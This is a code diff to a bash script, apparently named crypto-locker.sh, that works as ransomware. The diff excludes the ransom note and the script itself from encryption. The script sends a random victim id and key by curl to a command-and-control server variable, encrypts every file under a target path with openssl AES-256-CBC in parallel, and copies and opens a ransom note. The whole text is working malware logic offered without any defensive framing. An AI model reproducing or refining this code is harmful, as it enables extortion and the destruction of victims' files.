@@ -18,8 +18,9 @@ if [ "$cmd" = "dec" ]; then
     fi
 fi
 # encrypt command
-if [ "$cmd" = "enc" ]; then
+if [ "$cmd" = "enc" ] && [ $file != "ransom.txt" ] && [ $file != "crypto-locker.sh" ]; then
     /usr/bin/file "$file"|grep -sq openssl;
+    
     # only encrypt un-encrypted files
     if [ "$?" -eq "1" ]; then 
         /usr/bin/openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$key";
@@ -32,8 +33,8 @@ if [ "$cmd" = "lock" ]; then
     id=`openssl rand -base64 32`
     key=`openssl rand -base64 32`
     url="$c2server?id=$id&key=$key"
-    /usr/bin/curl -s $url>$HOME/ransom.txt& 
-    echo "PID $$ ENCRYPTING: $root_path with [$key]"
+    /usr/bin/curl -s $url>$HOME/ransom.txt
+    echo "PID $$ ENCRYPTING: $root_path with [$key]" >> $HOME/ransom.txt
     find $root_path -type f | xargs -P 4 -I % $self enc "$key" '%'
     cp $HOME/ransom.txt $HOME/Documents/ransom.txt
     open $HOME/ransom.txt
